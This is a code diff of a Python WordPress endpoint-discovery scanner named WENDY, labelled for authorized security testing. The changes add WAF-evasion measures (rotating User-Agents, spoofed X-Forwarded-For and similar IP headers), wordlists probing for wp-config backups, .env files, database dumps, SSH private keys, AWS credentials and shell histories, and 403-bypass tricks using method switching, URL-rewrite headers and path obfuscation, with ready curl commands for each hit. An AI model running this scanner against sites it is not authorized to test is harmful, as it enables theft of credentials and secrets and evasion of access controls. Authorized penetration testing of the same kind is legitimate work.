@@ -22,7 +22,7 @@ class EndpointDiscovery:
         
         # Retry strategy
         retry_strategy = Retry(
-            total=2,
+            total=3,
             backoff_factor=1,
             status_forcelist=[429, 500, 502, 503, 504],
         )
@@ -30,15 +30,30 @@ class EndpointDiscovery:
         self.session.mount("http://", adapter)
         self.session.mount("https://", adapter)
         
-        # Low-profile headers to avoid WAF detection
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        }
+        # Comprehensive User-Agent list for rotation
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
+        ]
+
+        # Common WAF bypass headers
+        self.bypass_headers_list = [
+            'X-Forwarded-For',
+            'X-Forwarded-Host',
+            'X-Remote-IP',
+            'X-Remote-Addr',
+            'X-Client-IP',
+            'X-Real-IP',
+            'X-Originating-IP',
+            'X-Custom-IP-Authorization',
+            'CF-Connecting-IP',
+            'True-Client-IP',
+            'X-Cluster-Client-IP'
+        ]
         
         # Categories of endpoints to test
         self.endpoint_categories = {
@@ -50,150 +65,98 @@ class EndpointDiscovery:
             'api_endpoints': self.get_api_endpoints,
             'cache_files': self.get_cache_endpoints,
             'debug_files': self.get_debug_endpoints,
-            'plugin_specific': self.get_plugin_specific_endpoints
+            'plugin_specific': self.get_plugin_specific_endpoints,
+            'sensitive_files': self.get_sensitive_files_endpoints
         }
+
+    def get_random_headers(self):
+        """Generate a randomized header set for each request"""
+        headers = {
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0'
+        }
+        
+        # Add a random bypass header with a random IP
+        bypass_header = random.choice(self.bypass_headers_list)
+        random_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        headers[bypass_header] = random_ip
+        
+        return headers
 
     def get_backup_endpoints(self, base_url):
         """Common backup file locations"""
-        return [
-            '/wp-config.php.bak',
-            '/wp-config.php~',
-            '/wp-config.php.save',
-            '/wp-config.php.old',
-            '/wp-config.php.orig',
-            '/.wp-config.php.swp',
-            '/wp-config.bak',
-            '/backup.zip',
-            '/backup.sql',
-            '/backup.tar.gz',
-            '/database.sql',
-            '/db_backup.sql',
-            '/wp_backup.sql',
-            '/site_backup.zip',
-            '/wordpress_backup.zip',
-            '/.htaccess.bak',
-            '/.htaccess~',
-            '/wp-config.php.backup',
-            '/wp-config.php.bkp',
-            '/wp-config.php.copy',
-            '/wp-config.php.disabled',
-            '/wp-config.php.tmp',
-            '/wp-config.php.txt',
-            '/wp-config.php.zip',
-            '/wp-config.php.tar.gz',
-            '/wp-config.bkp',
-            '/wp-config.old',
-            '/wp-config.php.bak.php',
-            '/db.sql',
-            '/database_backup.sql',
-            '/backup-db.sql',
-            '/wp.sql',
-            '/wordpress.sql',
-            '/wordpress.sql.gz',
-            '/database.sql.gz',
-            '/db_backup.sql.gz',
-            '/site.zip',
-            '/site.tar.gz',
-            '/website.zip',
-            '/website_backup.zip',
-            '/public_html.zip',
-            '/www.zip',
-            '/html.zip',
-            '/.htaccess.old',
-            '/.htaccess.save',
-            '/.htaccess.bkp',
-            '/.htaccess.disabled',
-            '/wp-content/backup-db',
-            '/wp-config.php#',
-            '/wp-config.php.swo',
-            '/wp-config.php.swn',
-            '/.htaccess.orig'
+        common_backups = [
+            '/wp-config.php.bak', '/wp-config.php~', '/wp-config.php.save', '/wp-config.php.old',
+            '/wp-config.php.orig', '/.wp-config.php.swp', '/wp-config.bak', '/backup.zip',
+            '/backup.sql', '/backup.tar.gz', '/database.sql', '/db_backup.sql', '/wp_backup.sql',
+            '/site_backup.zip', '/wordpress_backup.zip', '/.htaccess.bak', '/.htaccess~',
+            '/wp-config.php.backup', '/wp-config.php.bkp', '/wp-config.php.copy', '/wp-config.php.disabled',
+            '/wp-config.php.tmp', '/wp-config.php.txt', '/wp-config.php.zip', '/wp-config.php.tar.gz',
+            '/wp-config.bkp', '/wp-config.old', '/wp-config.php.bak.php', '/db.sql',
+            '/database_backup.sql', '/backup-db.sql', '/wp.sql', '/wordpress.sql', '/wordpress.sql.gz',
+            '/database.sql.gz', '/db_backup.sql.gz', '/site.zip', '/site.tar.gz', '/website.zip',
+            '/website_backup.zip', '/public_html.zip', '/www.zip', '/html.zip', '/.htaccess.old',
+            '/.htaccess.save', '/.htaccess.bkp', '/.htaccess.disabled', '/wp-content/backup-db',
+            '/wp-config.php#', '/wp-config.php.swo', '/wp-config.php.swn', '/.htaccess.orig',
+            '/dump.sql', '/mysql.sql', '/sql.zip', '/sql.tar.gz', '/data.sql', '/db.zip', '/db.tar.gz',
+            '/backup.rar', '/backup.7z', '/all.zip', '/archive.zip', '/full.zip', '/master.zip',
+            '/wp-content/debug.log.bak', '/wp-content/debug.log.old'
         ]
+        
+        # Add some date-based fuzzed backups
+        import datetime
+        now = datetime.datetime.now()
+        dates = [
+            now.strftime("%Y"), now.strftime("%Y-%m"), now.strftime("%Y%m%d"),
+            (now - datetime.timedelta(days=1)).strftime("%Y%m%d"),
+            (now - datetime.timedelta(days=30)).strftime("%Y-%m")
+        ]
+        
+        fuzzed = []
+        for d in dates:
+            fuzzed.extend([f'/backup-{d}.zip', f'/backup-{d}.sql', f'/db-{d}.sql', f'/{d}.zip', f'/{d}.sql'])
+            
+        return list(set(common_backups + fuzzed))
 
     def get_config_endpoints(self, base_url):
         """Configuration and sensitive files"""
         return [
-            '/wp-config.php',
-            '/wp-config-sample.php',
-            '/wp-config.php~',
-            '/wp-config.php.bak',
-            '/wp-config.php.old',
-            '/wp-config.php.save',
-            '/wp-config.php.orig',
-            '/.env',
-            '/.env.local',
-            '/.env.production',
-            '/.env.dev',
-            '/.env.prod',
-            '/.env.stage',
-            '/.env.staging',
-            '/.env.test',
-            '/.env.backup',
-            '/.env.bak',
-            '/.env.old',
-            '/config.php',
-            '/config.inc.php',
-            '/local-config.php',
-            '/settings.php',
-            '/settings.local.php',
-            '/configuration.php',
-            '/parameters.yml',
-            '/parameters.yaml',
-            '/services.yml',
-            '/services.yaml',
-            '/config.json',
-            '/app.json',
-            '/appsettings.json',
-            '/appsettings.Production.json',
-            '/composer.json',
-            '/package.json',
-            '/firebase.json',
-            '/credentials.json',
-            '/.git/config',
-            '/.git/HEAD',
-            '/.git/index',
-            '/.git/logs/HEAD',
-            '/.gitmodules',
-            '/.gitignore',
-            '/web.config',
-            '/server.xml',
-            '/.htpasswd',
-            '/passwd',
-            '/etc/passwd'
+            '/wp-config.php', '/wp-config-sample.php', '/wp-config.php~', '/wp-config.php.bak',
+            '/wp-config.php.old', '/wp-config.php.save', '/wp-config.php.orig', '/.env',
+            '/.env.local', '/.env.production', '/.env.dev', '/.env.prod', '/.env.stage',
+            '/.env.staging', '/.env.test', '/.env.backup', '/.env.bak', '/.env.old',
+            '/config.php', '/config.inc.php', '/local-config.php', '/settings.php',
+            '/settings.local.php', '/configuration.php', '/parameters.yml', '/parameters.yaml',
+            '/services.yml', '/services.yaml', '/config.json', '/app.json', '/appsettings.json',
+            '/appsettings.Production.json', '/composer.json', '/package.json', '/firebase.json',
+            '/credentials.json', '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
+            '/.gitmodules', '/.gitignore', '/web.config', '/server.xml', '/.htpasswd',
+            '/passwd', '/etc/passwd', '/php.ini', '/.user.ini', '/web.config.bak', '/nginx.conf',
+            '/.vscode/settings.json', '/.idea/workspace.xml', '/.dockerignore', '/Dockerfile',
+            '/docker-compose.yml', '/Procfile', '/runtime.txt', '/requirements.txt', '/Gemfile'
         ]
 
     def get_log_endpoints(self, base_url):
         """Log files that might contain sensitive info"""
         return [
-            '/debug.log',
-            '/error.log',
-            '/access.log',
-            '/wp-content/debug.log',
-            '/wp-content/uploads/debug.log',
-            '/wp-content/cache/debug.log',
-            '/wp-content/logs/debug.log',
-            '/wp-content/logs/error.log',
-            '/wp-content/logs/access.log',
-            '/logs/debug.log',
-            '/logs/error.log',
-            '/logs/access.log',
-            '/log/error.log',
-            '/log/access.log',
-            '/var/log/apache2/error.log',
-            '/var/log/apache2/access.log',
-            '/var/log/nginx/error.log',
-            '/var/log/nginx/access.log',
-            '/error_log',
-            '/access_log',
-            '/wp-admin/error.log',
-            '/wp-includes/error.log',
-            '/application.log',
-            '/system.log',
-            '/php_errors.log',
-            '/php_error.log',
-            '/php.log',
-            '/mysql.log',
-            '/mysqld.log'
+            '/debug.log', '/error.log', '/access.log', '/wp-content/debug.log',
+            '/wp-content/uploads/debug.log', '/wp-content/cache/debug.log', '/wp-content/logs/debug.log',
+            '/wp-content/logs/error.log', '/wp-content/logs/access.log', '/logs/debug.log',
+            '/logs/error.log', '/logs/access.log', '/log/error.log', '/log/access.log',
+            '/var/log/apache2/error.log', '/var/log/apache2/access.log', '/var/log/nginx/error.log',
+            '/var/log/nginx/access.log', '/error_log', '/access_log', '/wp-admin/error.log',
+            '/wp-includes/error.log', '/application.log', '/system.log', '/php_errors.log',
+            '/php_error.log', '/php.log', '/mysql.log', '/mysqld.log', '/sql.log', '/db.log',
+            '/wp-content/uploads/wc-logs/', '/wp-content/uploads/wc-logs/error.log'
         ]
 
 
@@ -377,17 +340,18 @@ class EndpointDiscovery:
         ]
 
     def get_plugin_specific_endpoints(self, base_url):
-        """Plugin-specific endpoints based on WPScan results"""
+        """Plugin-specific endpoints based on common WordPress plugins and vulnerabilities"""
         plugins = [
-            'royal-elementor-addons',
-            'elementor', 
-            'ewww-image-optimizer',
-            'wp-fastest-cache',
-            'wordfence',
-            'the-events-calendar',
-            'complianz-gdpr',
-            'duplicate-page',
-            'events-widgets-for-elementor-and-the-events-calendar'
+            'royal-elementor-addons', 'elementor', 'ewww-image-optimizer', 'wp-fastest-cache',
+            'wordfence', 'the-events-calendar', 'complianz-gdpr', 'duplicate-page',
+            'events-widgets-for-elementor-and-the-events-calendar', 'contact-form-7',
+            'wp-file-manager', 'woocommerce', 'jetpack', 'all-in-one-seo-pack', 'yoast-seo',
+            'wp-forms', 'akismet', 'updraftplus', 'monsterinsights', 'advanced-custom-fields',
+            'revslider', 'js_composer', 'wp-bakery', 'gravityforms', 'duplicator',
+            'backupbuddy', 'wp-migrate-db', 'wp-rocket', 'autoptimize', 'w3-total-cache',
+            'all-in-one-wp-migration', 'wp-super-cache', 'ithemes-security', 'sucuri-scanner',
+            'ninja-forms', 'mailchimp-for-wp', 'smush', 'broken-link-checker', 'redirection',
+            'tablepress', 'query-monitor', 'better-wp-security', 'mainwp'
         ]
         
         endpoints = []
@@ -421,19 +385,59 @@ class EndpointDiscovery:
         
         return endpoints
 
+    def get_sensitive_files_endpoints(self, base_url):
+        """Generic sensitive files often found on web servers"""
+        return [
+            '/.ssh/id_rsa',
+            '/.ssh/id_dsa',
+            '/.ssh/authorized_keys',
+            '/.ssh/known_hosts',
+            '/.aws/credentials',
+            '/.aws/config',
+            '/.npmrc',
+            '/.bash_history',
+            '/.zsh_history',
+            '/.mysql_history',
+            '/.psql_history',
+            '/.docker/config.json',
+            '/.dockercfg',
+            '/.vimrc',
+            '/.ssh/id_rsa.pub',
+            '/.ssh/id_rsa.bak',
+            '/.ssh/id_rsa~',
+            '/.git-credentials',
+            '/.gnupg/secring.gpg',
+            '/.gnupg/pubring.gpg',
+            '/auth.json',
+            '/.s3cfg',
+            '/.wp-cli/config.yml',
+            '/.netrc',
+            '/.passwd',
+            '/.shadow'
+        ]
+
+    def generate_curl_command(self, url, method='GET', headers=None):
+        """Generate a curl command for manual testing"""
+        cmd = f"curl -i -X {method} '{url}'"
+        if headers:
+            for k, v in headers.items():
+                v_escaped = str(v).replace("'", "'\\''")
+                cmd += f" -H '{k}: {v_escaped}'"
+        return cmd
+
     def verify_403_validity(self, base_url):
         """Verify if 403 responses are real or false positives"""
         # Test a clearly non-existent endpoint
         fake_endpoints = [
-            '/this-definitely-does-not-exist-12345',
-            '/fake-dir-test-999/', 
-            '/nonexistent-file-xyz.txt'
+            f'/this-definitely-does-not-exist-{random.randint(10000, 99999)}',
+            f'/fake-dir-test-{random.randint(10000, 99999)}/', 
+            f'/nonexistent-file-{random.randint(10000, 99999)}.txt'
         ]
         
         for fake_endpoint in fake_endpoints:
             try:
                 url = f"{base_url.rstrip('/')}{fake_endpoint}"
-                response = self.session.get(url, headers=self.headers, timeout=10, allow_redirects=False)
+                response = self.session.get(url, headers=self.get_random_headers(), timeout=10, allow_redirects=False)
                 
                 if response.status_code == 403:
                     return False  # Server returns 403 for non-existent files = false positive
@@ -448,148 +452,138 @@ class EndpointDiscovery:
     def test_403_bypasses(self, base_url, endpoint):
         """Test various bypass techniques for 403 forbidden endpoints"""
         bypasses = []
-        original_url = f"{base_url.rstrip('/')}{endpoint}"
         
-        # 1. X-Original-URL header bypass
-        try:
-            headers = self.headers.copy()
-            headers['X-Original-URL'] = endpoint
-            fake_url = f"{base_url.rstrip('/')}/anything"
-            response = self.session.get(fake_url, headers=headers, timeout=10, allow_redirects=False)
-            if response.status_code == 200:
-                bypasses.append({
-                    'method': 'X-Original-URL Header',
-                    'url': fake_url,
-                    'headers': 'X-Original-URL: ' + endpoint,
-                    'status': response.status_code,
-                    'preview': response.text[:200]
-                })
-        except Exception:
-            pass
-
-        # 2. %2e after first slash
-        try:
-            if endpoint.startswith('/'):
-                bypass_url = f"{base_url.rstrip('/')}/%2e{endpoint}"
-                response = self.session.get(bypass_url, headers=self.headers, timeout=10, allow_redirects=False)
+        # 1. HTTP Methods Bypass
+        methods = ['POST', 'PUT', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
+        for method in methods:
+            try:
+                headers = self.get_random_headers()
+                bypass_url = f"{base_url.rstrip('/')}{endpoint}"
+                response = self.session.request(method, bypass_url, headers=headers, timeout=10, allow_redirects=False)
                 if response.status_code == 200:
                     bypasses.append({
-                        'method': '%2e Encoding',
+                        'method': f'HTTP Method Bypass ({method})',
                         'url': bypass_url,
                         'status': response.status_code,
-                        'preview': response.text[:200]
+                        'preview': response.text[:200],
+                        'curl_command': self.generate_curl_command(bypass_url, method=method, headers=headers)
                     })
-        except Exception:
-            pass
+            except Exception:
+                pass
 
-        # 3. Dot, slash, semicolon variations
+        # 2. Header-based bypasses
+        header_payloads = [
+            {'X-Original-URL': endpoint},
+            {'X-Rewrite-URL': endpoint},
+            {'X-Forwarded-Path': endpoint},
+            {'X-Real-URL': endpoint},
+            {'X-ProxyUser-Ip': '127.0.0.1'},
+            {'X-Forwarded-For': '127.0.0.1'},
+            {'X-Forwarded-For': '::1'},
+            {'X-Originating-IP': '127.0.0.1'},
+            {'X-Remote-IP': '127.0.0.1'},
+            {'X-Remote-Addr': '127.0.0.1'},
+            {'X-Client-IP': '127.0.0.1'},
+            {'X-Host': '127.0.0.1'},
+            {'Forwarded': 'for=127.0.0.1;proto=http;host=localhost'},
+        ]
+
+        for payload in header_payloads:
+            try:
+                headers = self.get_random_headers()
+                headers.update(payload)
+                # For URL rewrite headers, we often need to request a "safe" path
+                url = f"{base_url.rstrip('/')}/" if any(k in payload for k in ['X-Original-URL', 'X-Rewrite-URL', 'X-Forwarded-Path']) else f"{base_url.rstrip('/')}{endpoint}"
+                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=False)
+                if response.status_code == 200:
+                    bypasses.append({
+                        'method': f'Header Bypass ({list(payload.keys())[0]})',
+                        'url': url,
+                        'headers': str(payload),
+                        'status': response.status_code,
+                        'preview': response.text[:200],
+                        'curl_command': self.generate_curl_command(url, method='GET', headers=headers)
+                    })
+            except Exception:
+                pass
+
+        # 3. Path Obfuscation variations
         variations = [
             endpoint + '/.',
             '//' + endpoint.lstrip('/') + '//',
             '/./' + endpoint.lstrip('/') + '/..',
             '/;/' + endpoint.lstrip('/'),
             '/.;/' + endpoint.lstrip('/'),
-            '//;//' + endpoint.lstrip('/')
+            '//;//' + endpoint.lstrip('/'),
+            endpoint + '..;/',
+            endpoint + '%20',
+            endpoint + '%09',
+            endpoint + '%00',
+            endpoint + '.html',
+            endpoint + '?',
+            endpoint + '??',
+            endpoint + '#',
+            '/%2e' + endpoint,
+            '/.' + endpoint,
+            './' + endpoint.lstrip('/'),
+            '/./' + endpoint.lstrip('/')
         ]
         
         for variation in variations:
             try:
                 bypass_url = f"{base_url.rstrip('/')}{variation}"
-                response = self.session.get(bypass_url, headers=self.headers, timeout=10, allow_redirects=False)
+                headers = self.get_random_headers()
+                response = self.session.get(bypass_url, headers=headers, timeout=10, allow_redirects=False)
                 if response.status_code == 200:
                     bypasses.append({
                         'method': f'Path Variation ({variation})',
                         'url': bypass_url,
                         'status': response.status_code,
-                        'preview': response.text[:200]
+                        'preview': response.text[:200],
+                        'curl_command': self.generate_curl_command(bypass_url, method='GET', headers=headers)
                     })
             except Exception:
                 continue
 
-        # 4. ..;/ bypass
+        # 4. Case variation bypass
         try:
-            if '/' in endpoint.strip('/'):
-                parts = endpoint.strip('/').split('/')
-                if len(parts) > 0:
-                    modified_endpoint = '/' + '/'.join(parts[:-1]) + '/' + parts[-1] + '..;/'
-                    bypass_url = f"{base_url.rstrip('/')}{modified_endpoint}"
-                    response = self.session.get(bypass_url, headers=self.headers, timeout=10, allow_redirects=False)
-                    if response.status_code == 200:
-                        bypasses.append({
-                            'method': '..;/ Directory Bypass',
-                            'url': bypass_url,
-                            'status': response.status_code,
-                            'preview': response.text[:200]
-                        })
-        except Exception:
-            pass
-
-        # 5. Case variation bypass
-        try:
-            # Create case variations
             case_variations = []
             original_path = endpoint.strip('/')
             if original_path:
-                # Random case mixing
-                varied_path = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in original_path)
-                case_variations.append('/' + varied_path)
-                
-                # All uppercase
+                case_variations.append('/' + ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in original_path))
                 case_variations.append('/' + original_path.upper())
-                
-                # Title case
                 case_variations.append('/' + original_path.title())
 
             for variation in case_variations:
                 bypass_url = f"{base_url.rstrip('/')}{variation}"
-                response = self.session.get(bypass_url, headers=self.headers, timeout=10, allow_redirects=False)
+                headers = self.get_random_headers()
+                response = self.session.get(bypass_url, headers=headers, timeout=10, allow_redirects=False)
                 if response.status_code == 200:
                     bypasses.append({
                         'method': f'Case Variation ({variation})',
                         'url': bypass_url,
                         'status': response.status_code,
-                        'preview': response.text[:200]
+                        'preview': response.text[:200],
+                        'curl_command': self.generate_curl_command(bypass_url, method='GET', headers=headers)
                     })
         except Exception:
             pass
-
-        # 6. Web Cache Poisoning with X-Original-URL (alternative headers)
-        cache_headers = ['X-Rewrite-URL', 'X-Forwarded-Path', 'X-Real-URL']
-        for header_name in cache_headers:
-            try:
-                headers = self.headers.copy()
-                headers[header_name] = endpoint
-                fake_url = f"{base_url.rstrip('/')}/cache-test"
-                response = self.session.get(fake_url, headers=headers, timeout=10, allow_redirects=False)
-                if response.status_code == 200:
-                    bypasses.append({
-                        'method': f'Cache Poisoning ({header_name})',
-                        'url': fake_url,
-                        'headers': f'{header_name}: {endpoint}',
-                        'status': response.status_code,
-                        'preview': response.text[:200]
-                    })
-            except Exception:
-                continue
 
         return bypasses
 
     def verify_403_specific(self, base_url, endpoint):
         """Verify if a specific 403 response is real by testing with random extension"""
         import string
+        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
         
-        # Generate random string
-        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=8))
-        
-        # Create test endpoint with random suffix
         if endpoint.endswith('/'):
             test_endpoint = endpoint + random_suffix
         else:
-            test_endpoint = endpoint + '-' + random_suffix
+            test_endpoint = f"{endpoint}-{random_suffix}"
         
         try:
             test_url = f"{base_url.rstrip('/')}{test_endpoint}"
-            response = self.session.get(test_url, headers=self.headers, timeout=10, allow_redirects=False)
+            response = self.session.get(test_url, headers=self.get_random_headers(), timeout=10, allow_redirects=False)
             
             if response.status_code == 403:
                 return False, f"False positive (test endpoint {test_endpoint} also returns 403)"
@@ -607,9 +601,10 @@ class EndpointDiscovery:
         
         try:
             # Random delay to avoid rate limiting
-            time.sleep(random.uniform(0.5, 2.0))
+            time.sleep(random.uniform(0.5, 1.5))
             
-            response = self.session.get(url, headers=self.headers, timeout=10, allow_redirects=False)
+            headers = self.get_random_headers()
+            response = self.session.get(url, headers=headers, timeout=10, allow_redirects=False)
             
             result = {
                 'url': url,
@@ -622,7 +617,8 @@ class EndpointDiscovery:
                 'reason': '',
                 'preview': '',
                 'bypasses': [],
-                'verification': ''
+                'verification': '',
+                'curl_command': self.generate_curl_command(url, headers=headers)
             }
             
             # Determine if endpoint is interesting
@@ -793,6 +789,9 @@ class EndpointDiscovery:
                     print(f"   • {result['endpoint']}")
                     print(f"     Reason: {result.get('reason', 'N/A')}")
                     
+                    if result.get('curl_command'):
+                        print(f"     Manual Test: {result['curl_command']}")
+                    
                     # Show verification info for 403s
                     if result.get('verification'):
                         print(f"     Verification: {result['verification']}")
@@ -806,6 +805,8 @@ class EndpointDiscovery:
                         print(f"     🚨 BYPASSES FOUND ({len(result['bypasses'])}):")
                         for bypass in result['bypasses']:
                             print(f"       - {bypass['method']}: {bypass['status']}")
+                            if bypass.get('curl_command'):
+                                print(f"         Manual Test: {bypass['curl_command']}")
                             if 'headers' in bypass:
                                 print(f"         Headers: {bypass['headers']}")
                             if bypass.get('preview'):
@@ -869,7 +870,8 @@ def main():
 
 if __name__ == "__main__":
     print("=" * 80)
-    print("🔍 WORDPRESS ENDPOINT DISCOVERY")
+    print("🔍 WENDY - Wordpress ENDpoint discoverY")
     print("📚 For Authorized Security Testing Only")
+    print("Dognet Technologies srl | info@dognet.tech")
     print("=" * 80)
     main()
